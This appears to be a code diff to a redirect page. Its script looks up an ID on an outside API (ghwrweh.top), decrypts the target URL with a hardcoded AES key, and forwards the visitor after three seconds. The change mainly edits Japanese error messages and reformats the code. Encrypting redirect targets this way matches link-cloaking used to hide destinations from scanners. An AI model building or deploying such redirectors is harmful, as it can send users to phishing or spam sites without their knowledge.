@@ -21,10 +21,12 @@
 
   <script>
     const AES_KEY = "5Ctianyoumabiiii";
-    const id = location.pathname.split("/").pop();
+
+    // 获取路径中的 ID
+    let id = location.pathname.split("/").filter(Boolean).pop();
 
     if (!id) {
-      document.body.innerHTML = "<h3>無効なIDです</h3>";
+      document.body.innerHTML += "<p style='color:red;'>IDが見つかりません。</p>";
     } else {
       fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
         .then(r => r.json())
@@ -35,27 +37,33 @@
               if (url) {
                 setTimeout(() => location.href = url, 3000);
               } else {
-                document.body.innerHTML += "<p>復号に失敗しました。</p>";
+                document.body.innerHTML += "<p style='color:red;'>復号に失敗しました。</p>";
               }
             });
           } else {
-            document.body.innerHTML += "<p>IDが存在しません。</p>";
+            document.body.innerHTML += "<p style='color:red;'>リダイレクト先が見つかりません。</p>";
           }
         })
         .catch(() => {
-          document.body.innerHTML += "<p>サーバーエラーが発生しました。</p>";
+          document.body.innerHTML += "<p style='color:red;'>API取得時にエラーが発生しました。</p>";
         });
     }
 
     async function decryptAES(encText) {
       try {
-        const b64 = encText.replace(/-/g,'+').replace(/_/g,'/');
-        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-        const iv = bytes.slice(0,16), data = bytes.slice(16);
-        const key = await crypto.subtle.importKey("raw",
-          new TextEncoder().encode(AES_KEY), {name:"AES-CBC"}, false, ["decrypt"]);
-        const dec = await crypto.subtle.decrypt({name:"AES-CBC", iv}, key, data);
-        return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
+        const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
+        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+        const iv = bytes.slice(0, 16);
+        const data = bytes.slice(16);
+        const key = await crypto.subtle.importKey(
+          "raw",
+          new TextEncoder().encode(AES_KEY),
+          { name: "AES-CBC" },
+          false,
+          ["decrypt"]
+        );
+        const decrypted = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
+        return new TextDecoder().decode(decrypted).replace(/\u0000+$/, "");
       } catch {
         return null;
       }
